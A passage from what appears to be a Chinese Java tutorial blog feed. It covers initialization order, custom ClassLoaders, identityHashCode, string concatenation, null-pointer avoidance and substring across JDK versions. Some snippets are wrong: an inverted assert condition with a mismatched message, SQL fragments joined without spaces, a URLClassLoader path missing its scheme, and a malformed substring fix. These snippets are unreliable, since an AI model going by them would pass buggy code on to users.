title="示例2：测试类继承的初始化顺序"></a>示例2：测试类继承的初始化顺序</h4><pre class="line-numbers language-none"><code class="language-none">class Parent &#123;private static String parentStaticField &#x3D; &quot;parent static field&quot;;static &#123;System.out.println(parentStaticField);System.out.println(&quot;parent static block&quot;);&#125;private String parentField &#x3D; &quot;parent member field&quot;;&#123;System.out.println(parentField);System.out.println(&quot;parent non-static block&quot;);&#125;public Parent() &#123;System.out.println(&quot;parent constructor&quot;);&#125;&#125;public class Child extends Parent &#123;private static String childStaticField &#x3D; &quot;child static field&quot;;static &#123;System.out.println(childStaticField);System.out.println(&quot;child static block&quot;);&#125;private String childField &#x3D; &quot;child member field&quot;;&#123;System.out.println(childField);System.out.println(&quot;child non-static block&quot;);&#125;public Child() &#123;System.out.println(&quot;child constructor&quot;);&#125;public static void main(String[] args) &#123;new Child();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">parent static fieldparent static blockchild static fieldchild static blockparent member fieldparent non-static blockparent constructorchild member fieldchild non-static blockchild constructor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得出以下结论，单类的初始化顺序为：</p><blockquote><p><strong>父类静态变量 &gt; 父类静态初始块 &gt; 子类静态变量 &gt; 子类静态初始块 &gt; 父类成员变量 &gt; 父类非静态初始块 &gt; 父类构造器 &gt; 子类成员变量 &gt; 子类非静态初始块 &gt; 子类构造器</strong></p></blockquote><h4 id="示例3：测试成员变量、初始块的初始化顺序"><a href="#示例3：测试成员变量、初始块的初始化顺序" class="headerlink" title="示例3：测试成员变量、初始块的初始化顺序"></a>示例3：测试成员变量、初始块的初始化顺序</h4><p>从上面两个例子可以看出，父类的静态变量和静态初始块肯定是先于子类加载的。但同一个类中的静态变量与静态初始块之间，成员变量与初始块之间的顺序一定是变量先于初始块吗？继续演示！</p><pre class="line-numbers language-none"><code class="language-none">public class TestOrder &#123;private static A a &#x3D; new A();static &#123;System.out.println(&quot;static block&quot;);&#125;private static B b &#x3D; new B();public static void main(String[] args) &#123;new TestOrder();&#125;&#125;class A &#123;public A() &#123;System.out.println(&quot;static field A&quot;);&#125;&#125;class B &#123;public B() &#123;System.out.println(&quot;static field B&quot;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><pre class="line-numbers language-none"><code class="language-none">static field Astatic blockstatic field B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以得出以下结论，单类的初始化顺序为：</p><blockquote><p><strong>静态变量A &gt; 静态初始块 &gt; 静态变量B</strong></p></blockquote><p>所以，它们的在类中的顺序就决定了它们的初始化顺序，而不是变量一定会优先于初始块。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 自定义 ClassLoader 实战</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E8%87%AA%E5%AE%9A%E4%B9%89%20ClassLoader%20%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/Java%20%E8%87%AA%E5%AE%9A%E4%B9%89%20ClassLoader%20%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>假如我们的类不在classpath下，而我们又想读取一个自定义的目录下的class，如果做呢？</p><h2 id="读取自定义目录的类"><a href="#读取自定义目录的类" class="headerlink" title="读取自定义目录的类"></a>读取自定义目录的类</h2><p>示例读取c:&#x2F;test&#x2F;com&#x2F;test.jdk&#x2F;Key.class这个类。</p><pre class="line-numbers language-none"><code class="language-none">package com.test.jdk;public class Key &#123;    private String key &#x3D; &quot;111111&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><pre class="line-numbers language-none"><code class="language-none">import org.apache.commons.io.IOUtils;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;public class LocalClassLoader extends ClassLoader &#123;    private String path &#x3D; &quot;c:&#x2F;test&#x2F;&quot;;    @Override    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;        Class&lt;?&gt; cls &#x3D; findLoadedClass(name);        if (cls !&#x3D; null) &#123;            return cls;        &#125;        if (!name.endsWith(&quot;.Key&quot;)) &#123;            return super.loadClass(name);        &#125;        try &#123;            InputStream is &#x3D; new FileInputStream(path + name.replace(&quot;.&quot;, &quot;&#x2F;&quot;) + &quot;.class&quot;);            byte[] bytes &#x3D; IOUtils.toByteArray(is);            return defineClass(name, bytes, 0, bytes.length);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;        return super.loadClass(name);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="开始读取类"><a href="#开始读取类" class="headerlink" title="开始读取类"></a>开始读取类</h2><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    try &#123;        LocalClassLoader lcl &#x3D; new LocalClassLoader();        Class&lt;?&gt; cls &#x3D; lcl.loadClass(&quot;com.test.jdk.Key&quot;);        Field field &#x3D; FieldUtils.getField(cls, &quot;key&quot;, true);        Object value &#x3D; field.get(cls.newInstance());        System.out.println(value);    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自定义类加载器正常加载到类，程序最后输出：111111</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>上面自定义一个类加载器来读取自定义的目录，其实可以直接使用URLClassLoader就能读取，它已经实现了路径下类的读取逻辑。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    try &#123;        URLClassLoader ucl &#x3D; new URLClassLoader(new URL[]&#123;new URL(&quot;c:&#x2F;test&#x2F;&quot;)&#125;);        Class&lt;?&gt; cls &#x3D; ucl.loadClass(&quot;com.test.jdk.Key&quot;);        Field field &#x3D; FieldUtils.getField(cls, &quot;key&quot;, true);        Object value &#x3D; field.get(cls.newInstance());        System.out.println(value);    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hashCode 和 identityHashCode 的区别你知道吗？</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/hashCode%20%E5%92%8C%20identityHashCode%20%E7%9A%84%E5%8C%BA%E5%88%AB%E4%BD%A0%E7%9F%A5%E9%81%93%E5%90%97%EF%BC%9F/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/hashCode%20%E5%92%8C%20identityHashCode%20%E7%9A%84%E5%8C%BA%E5%88%AB%E4%BD%A0%E7%9F%A5%E9%81%93%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode"></a>hashCode</h2><p>关于hashCode参考之前的文章，<a href="https://mp.weixin.qq.com/s?__biz=MzI3ODcxMzQzMw==&mid=2247483797&idx=1&sn=e3bb47b13d0c3f25341470a0ce598752&chksm=eb5384a3dc240db5e6378dc5160fa01fd10569ffb5f95f5d5daa4589c3308515139b29e2b314#rd">点击</a>参考之前文章。</p><h2 id="identityHashCode"><a href="#identityHashCode" class="headerlink" title="identityHashCode"></a>identityHashCode</h2><p>identityHashCode是System里面提供的本地方法，java.lang.System#identityHashCode。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * Returns the same hash code for the given object as * would be returned by the default method hashCode(), * whether or not the given object&#39;s class overrides * hashCode(). * The hash code for the null reference is zero. * * @param x object for which the hashCode is to be calculated * @return  the hashCode * @since   JDK1.1 *&#x2F;public static native int identityHashCode(Object x);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>identityHashCode和hashCode的区别是，identityHashCode会返回对象的hashCode，而不管对象是否重写了hashCode方法。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;String str1 &#x3D; new String(&quot;abc&quot;);String str2 &#x3D; new String(&quot;abc&quot;);System.out.println(&quot;str1 hashCode: &quot; + str1.hashCode());System.out.println(&quot;str2 hashCode: &quot; + str2.hashCode());System.out.println(&quot;str1 identityHashCode: &quot; + System.identityHashCode(str1));System.out.println(&quot;str2 identityHashCode: &quot; + System.identityHashCode(str2));User user &#x3D; new User(&quot;test&quot;, 1);System.out.println(&quot;user hashCode: &quot; + user.hashCode());System.out.println(&quot;user identityHashCode: &quot; + System.identityHashCode(user));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">str1 hashCode: 96354str2 hashCode: 96354str1 identityHashCode: 1173230247str2 identityHashCode: 856419764user hashCode: 621009875user identityHashCode: 621009875<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果分析：</p><p>1、str1和str2的hashCode是相同的，是因为String类重写了hashCode方法，它根据String的值来确定hashCode的值，所以只要值一样，hashCode就会一样。</p><p>2、str1和str2的identityHashCode不一样，虽然String重写了hashCode方法，identityHashCode永远返回根据对象物理内存地址产生的hash值，所以每个String对象的物理地址不一样，identityHashCode也会不一样。</p><p>3、User对象没重写hashCode方法，所以hashCode和identityHashCode返回的值一样。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>hashCode方法可以被重写并返回重写后的值，identityHashCode会返回对象的hash值而不管对象是否重写了hashCode方法。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不能用 + 拼接字符串？ 这次我要吊打面试官！</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/%E4%B8%8D%E8%83%BD%E7%94%A8%20+%20%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9F%20%E8%BF%99%E6%AC%A1%E6%88%91%E8%A6%81%E5%90%8A%E6%89%93%E9%9D%A2%E8%AF%95%E5%AE%98%EF%BC%81/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/%E4%B8%8D%E8%83%BD%E7%94%A8%20+%20%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9F%20%E8%BF%99%E6%AC%A1%E6%88%91%E8%A6%81%E5%90%8A%E6%89%93%E9%9D%A2%E8%AF%95%E5%AE%98%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>我们做 Java 程序员以来，不管是工作当中，还是面试过程中，都知道：字符串拼接不能用 String，要用 <code>StringBuilder</code> 或者是 <code>StringBuffer</code>，以至于它们都被滥用了。</p><p>StringBuilder、StringBuffer 简称：SB，下文统一用 <code>SB</code> 代替。</p><p><code>SB</code>它们都是可变的字符串，它们之间的区别也是 Java 初中级面试战场上出现几率十分高的一道题，上场率没有 90% 也有 80% 吧。</p><p>这两个的具体区别请看这篇文章：<a href="https://mp.weixin.qq.com/s/Eeb9wa0DfUs9U5snahAJZQ">StringBuffer 和 StringBuilder 的 3 个区别</a>。</p><p>我们反过来想下，String真的是不可变的么？不一定，看下这篇：<a href="https://mp.weixin.qq.com/s/sLsCZ7T-GnkI6ZZXn22o-w">Java 中的 String 真的是不可变的吗？</a></p><p>当然，本文不是讨论字符串可变与不可变的问题，而是讨论：字符串拼接一定要用 <code>SB</code> 吗？为什么不能用 <code>+</code> ？能不能用 <code>+</code> ？什么时候可以用 <code>+</code> ？</p><p>为什么不能用 + 号拼接字符串？我不服，接下来我要吊打面试官！</p><h4 id="什么时候不能用"><a href="#什么时候不能用" class="headerlink" title="什么时候不能用 +"></a>什么时候不能用 <code>+</code></h4><p>通过多个表达式完成一个字符串拼接操作。</p><pre class="line-numbers language-none"><code class="language-none">private void test1() &#123;    String www &#x3D; &quot;www.&quot;;    String str &#x3D; www;    str +&#x3D; &quot;javastack.&quot;;    str +&#x3D; &quot;com&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字节码如下：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; access flags 0xAprivate static test2()VL0LINENUMBER 14 L0LDC &quot;www.&quot;ASTORE 0L1LINENUMBER 15 L1ALOAD 0ASTORE 1L2LINENUMBER 16 L2NEW java&#x2F;lang&#x2F;StringBuilderDUPINVOKESPECIAL java&#x2F;lang&#x2F;StringBuilder.&lt;init&gt; ()VALOAD 1INVOKEVIRTUAL java&#x2F;lang&#x2F;StringBuilder.append (Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;StringBuilder;LDC &quot;javastack.&quot;INVOKEVIRTUAL java&#x2F;lang&#x2F;StringBuilder.append (Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;StringBuilder;INVOKEVIRTUAL java&#x2F;lang&#x2F;StringBuilder.toString ()Ljava&#x2F;lang&#x2F;String;ASTORE 1L3LINENUMBER 17 L3NEW java&#x2F;lang&#x2F;StringBuilderDUPINVOKESPECIAL java&#x2F;lang&#x2F;StringBuilder.&lt;init&gt; ()VALOAD 1INVOKEVIRTUAL java&#x2F;lang&#x2F;StringBuilder.append (Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;StringBuilder;LDC &quot;com&quot;INVOKEVIRTUAL java&#x2F;lang&#x2F;StringBuilder.append (Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;StringBuilder;INVOKEVIRTUAL java&#x2F;lang&#x2F;StringBuilder.toString ()Ljava&#x2F;lang&#x2F;String;ASTORE 1L4LINENUMBER 18 L4RETURNL5LOCALVARIABLE www Ljava&#x2F;lang&#x2F;String; L1 L5 0LOCALVARIABLE str Ljava&#x2F;lang&#x2F;String; L2 L5 1MAXSTACK &#x3D; 2MAXLOCALS &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不会查看字节码的，看这里：<a href="https://mp.weixin.qq.com/s/bEEQf7bNik-rBPgK0uhjWg">3种骚操作，教你查看 Java 字节码</a>，看这一篇就会了。</p><p>观察下，<code>NEW java/lang/StringBuilder</code> 出现了两次，是因为我们在代码中拼接了两次，也就是说每一次拼接操作都会创建一次 <code>StringBuilder</code>。</p><p>如果我们是在一个循环中进行字符串拼接，那是不是一次拼接就要创建一个 <code>StringBuilder</code>？</p><p>wtf……这哪能接受！频繁创建对象是有性能开销的，这也是为什么我们常说的字符串不能用 <code>+</code> 拼接，而要用那两个 <code>SB</code>  拼接了。</p><h4 id="什么时候可以用"><a href="#什么时候可以用" class="headerlink" title="什么时候可以用 +"></a>什么时候可以用 <code>+</code></h4><p>直接将三个字面量的字符串拼接成一个字符串。</p><pre class="line-numbers language-none"><code class="language-none">private static void test2() &#123;    String str &#x3D; &quot;www.&quot; + &quot;javastack.&quot; + &quot;com&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>字节码如下：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; access flags 0x2private test2()VL0LINENUMBER 13 L0LDC &quot;www.javastack.com&quot;ASTORE 1L1LINENUMBER 14 L1RETURNL2LOCALVARIABLE this Lcom&#x2F;test&#x2F;jdk&#x2F;TestSB; L0 L2 0LOCALVARIABLE str Ljava&#x2F;lang&#x2F;String; L1 L2 1MAXSTACK &#x3D; 1MAXLOCALS &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从字节码看出，没有任何创建 <code>StringBuilder</code> 的指令，直接从常量池进行取出一个完整的字符串：<a href="http://www.javastack.com.很明显,这是/">www.javastack.com。很明显，这是</a> Java 编译器对代码进行了优化。</p><p>所以，通过这个示例告诉你，在这种情况下是可以用 <code>+</code> 号进行字符串拼接的。</p><p>这个示例可以演变成我们实际工作当中的某个 SQL 语句拼接的案例，如：</p><pre class="line-numbers language-none"><code class="language-none">String sql &#x3D; &quot;select name, sex, age, address&quot;        + &quot;from t_user&quot;        + &quot;where age &gt; 18&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>别说这样不行，这样是行的。</p><p>但你要是换成这样就不行了：</p><pre class="line-numbers language-none"><code class="language-none">String sql &#x3D; &quot;select name, sex, age, address&quot;;sql +&#x3D; &quot;from t_user&quot;;sql +&#x3D; &quot;where age &gt; 18&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样又回到创建多个 <code>StringBuilder</code> 的时候了。</p><p>也就是说，在一个表达式中完成字符串拼接是可以用 <code>+</code> 号完成的，因为编译器已经做了优化。</p><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>你只需要记住这两点：</p><p>1、在循环和多个表达式中不能 <code>+</code>，频繁创建 <code>SB</code> 性能影响；</p><p>2、在单个表达式中可以用 <code>+</code>，编译器直接做了优化；</p><p>老铁们，都搞清楚了？</p><p>这个观点有没有被误解很久？</p><p>下次面试，把这篇内容亮出来，吊打面试官，没问题的。</p><p>有收获的朋友一定要点个在看，这样我写原创更带劲了，谢了，老铁们。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别再写 bug 了，避免空指针的 5 个案例！</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/%E5%88%AB%E5%86%8D%E5%86%99%20bug%20%E4%BA%86%EF%BC%8C%E9%81%BF%E5%85%8D%E7%A9%BA%E6%8C%87%E9%92%88%E7%9A%84%205%20%E4%B8%AA%E6%A1%88%E4%BE%8B%EF%BC%81/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/%E5%88%AB%E5%86%8D%E5%86%99%20bug%20%E4%BA%86%EF%BC%8C%E9%81%BF%E5%85%8D%E7%A9%BA%E6%8C%87%E9%92%88%E7%9A%84%205%20%E4%B8%AA%E6%A1%88%E4%BE%8B%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>空指针是我们 Java 开发人员经常遇到的一个基本异常，这是一个极其普遍但似乎又无法根治的问题。</p><p>本文，栈长将带你了解什么是空指针，还有如何有效的避免空指针。</p><h2 id="什么是空指针？"><a href="#什么是空指针？" class="headerlink" title="什么是空指针？"></a>什么是空指针？</h2><p>当一个变量的值为 null 时，在 Java 里面表示一个不存在的空对象，没有实际内容，没有给它分配内存，null 也是对象成员变量的默认值。</p><p>所以，一个对象如果没有进行初始化操作，这时候，如果你调用这个对象的方法或者变量，就会出现空指针异常。</p><p>如下面示例会发生空指针异常：</p><pre class="line-numbers language-none"><code class="language-none">Object object &#x3D; null;String string &#x3D; object.toString();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="http://qianniu.javastack.cn/18-12-12/46377586.jpg"></p><p>从类结构图来看，空指针它是属于运行时异常 <code>RuntimeException</code> 的子类，它不是捕获型的，只有在程序运行时才可能报出来，而且会造成程序中断。</p><blockquote><p>什么是运行时异常及异常的分类请看这篇文章：<a href="https://mp.weixin.qq.com/s/xbopgxZ5BEDdSvwO9ad9Xg">一张图搞清楚 Java 异常机制</a>。</p></blockquote><h2 id="如何避免空指针？"><a href="#如何避免空指针？" class="headerlink" title="如何避免空指针？"></a>如何避免空指针？</h2><p>下面说几个空指针的几个最常见的案例及解决之道。</p><h4 id="1、字符串比较，常量放前面"><a href="#1、字符串比较，常量放前面" class="headerlink" title="1、字符串比较，常量放前面"></a>1、字符串比较，常量放前面</h4><pre class="line-numbers language-none"><code class="language-none">if(status.equals(SUCCESS))&#123;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个时候 status 可能为 null 造成空指针异常，应该把常量放前面，就能避免空指针异常。</p><pre class="line-numbers language-none"><code class="language-none">if(SUCCESS.equals(status))&#123;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个应该在各种开发规范里面都会提到，也是最基础的。</p><h4 id="2、初始化默认值"><a href="#2、初始化默认值" class="headerlink" title="2、初始化默认值"></a>2、初始化默认值</h4><p>在对象初始化的时候给它一个默认值或者默认构造实现，如：</p><pre class="line-numbers language-none"><code class="language-none">User user &#x3D; new User();String name &#x3D; StringUtils.EMPTY;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3、返回空集合"><a href="#3、返回空集合" class="headerlink" title="3、返回空集合"></a>3、返回空集合</h4><p>在返回一个集合的话，默认会是 null，统一规范返回一个空集合。</p><p>举个 List 例子，如：</p><pre class="line-numbers language-none"><code class="language-none">public List getUserList()&#123;    List list &#x3D; userMapper.gerUserList();    return list &#x3D;&#x3D; null ? new ArrayList() : list;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样接收方就不用担心空指针异常了，也不会影响业务。</p><h4 id="4、断言"><a href="#4、断言" class="headerlink" title="4、断言"></a>4、断言</h4><p>断言是用来检查程序的安全性的，在使用之前进行检查条件，如果不符合条件就报异常，符合就继续。</p><p>Java 中自带的断言关键字：assert，如：</p><pre class="line-numbers language-none"><code class="language-none">assert name &#x3D;&#x3D; null : &quot;名称不能为空&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">Exception in thread &quot;main&quot; java.lang.AssertionError: 名称不正确<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过默认是不启动断言检查的，需要要带上 JVM 参数：-enableassertions 才能生效。</p><p>Java 中这个用的很少，建议使用 Spring 中的，更强大，更方便好用。</p><p>Spring中的用法：</p><pre class="line-numbers language-none"><code class="language-none">Assert.notNull(name,&quot;名称不能为空&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5、Optional"><a href="#5、Optional" class="headerlink" title="5、Optional"></a>5、Optional</h4><p>Optional 是 JDK 8 新增的新特性，再也不用 !&#x3D; null 来判断了，这个在一个对象里面的多个子对象连续判断的时候非常有用。</p><p>这里不再详细介绍了，具体看这篇文章：<a href="https://mp.weixin.qq.com/s/uXw4eTZqLfj871FlciPh6Q">JDK8新特性之Optional</a>。</p><p>大家都有什么高见，欢迎留言分享！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串 substring 方法在 JDK 6,7,8 中的差异。</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/%E5%AD%97%E7%AC%A6%E4%B8%B2%20substring%20%E6%96%B9%E6%B3%95%E5%9C%A8%20JDK%206,7,8%20%E4%B8%AD%E7%9A%84%E5%B7%AE%E5%BC%82%E3%80%82/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/%E5%AD%97%E7%AC%A6%E4%B8%B2%20substring%20%E6%96%B9%E6%B3%95%E5%9C%A8%20JDK%206,7,8%20%E4%B8%AD%E7%9A%84%E5%B7%AE%E5%BC%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>标题中的substring方法指的是字符串的substring(int beginIndex, int endIndex)方法，这个方法在jdk6,7是有差异的。</p><h2 id="substring有什么用？"><a href="#substring有什么用？" class="headerlink" title="substring有什么用？"></a>substring有什么用？</h2><p>substring返回的是字符串索引位置beginIndex开始，endIndex-1结束的字符串。</p><p>来看这个例子：</p><pre class="line-numbers language-none"><code class="language-none">String x &#x3D; &quot;abcdef&quot;;x &#x3D; x.substring(1,3);System.out.println(x);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">bc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面看看在JDK之间，它们的实现原理有什么不一样，及值得注意的地方。</p><h4 id="JDK-6"><a href="#JDK-6" class="headerlink" title="JDK 6"></a>JDK 6</h4><p>String背后是由char数组构成的，在JDK6中，String包含三个字段：char value[], int offset, int count，意思很简单。</p><p>substring被调用时，它会创建一个新的字符串，但字符串的值还指向堆中同样的字符数组。它们的区别只是数量和下标引用不一样，如图所示。</p><p><img src="https://www.programcreek.com/wp-content/uploads/2013/09/string-substring-jdk6-650x389.jpeg" alt="image"></p><p>JDK6中的部分源码可以说明这个问题。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;JDK 6String(int offset, int count, char value[]) &#123;this.value &#x3D; value;this.offset &#x3D; offset;this.count &#x3D; count;&#125; public String substring(int beginIndex, int endIndex) &#123;&#x2F;&#x2F;check boundaryreturn  new String(offset + beginIndex, endIndex - beginIndex, value);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>会有什么问题？</strong></p><p>如果一个很长的字符串，但是每次使用substring()，你只需要很小的一部分。这将会导致性能问题，因为只需要一小部分，却引用了整个字符数组内容。对于JDK 6，解决方案是使用以下内容：</p><pre class="line-numbers language-none"><code class="language-none">x &#x3D; x.substring(x, y) + &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="JDK-7-8"><a href="#JDK-7-8" class="headerlink" title="JDK 7,8"></a>JDK 7,8</h4><p>JDK6这种问题在JDK7+中已经改善了，JDK7+中实际是重新创建了一个字符数组，如图。</p><p><img src="https://www.programcreek.com/wp-content/uploads/2013/09/string-substring-jdk71-650x389.jpeg" alt="image"></p><p>JDK7中的部分源码，JDK8类似。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;JDK 7public String(char value[], int offset, int count) &#123;&#x2F;&#x2F;check boundarythis.value &#x3D; Arrays.copyOfRange(value, offset, offset + count);&#125; public String substring(int beginIndex, int endIndex) &#123;&#x2F;&#x2F;check boundaryint subLen &#x3D; endIndex - beginIndex;return new String(value, beginIndex, subLen);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于JDK的这种差异，我们知道就好，现在应该都是JDK7及8了吧，其实对于小字符串的这种操作性能也是可以忽略不计的。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神奇，教你用随机数打印hello world</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/%E7%A5%9E%E5%A5%87%EF%BC%8C%E6%95%99%E4%BD%A0%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%89%93%E5%8D%B0hello%20world/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/%E7%A5%9E%E5%A5%87%EF%BC%8C%E6%95%99%E4%BD%A0%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%89%93%E5%8D%B0hello%20world/</url>
      
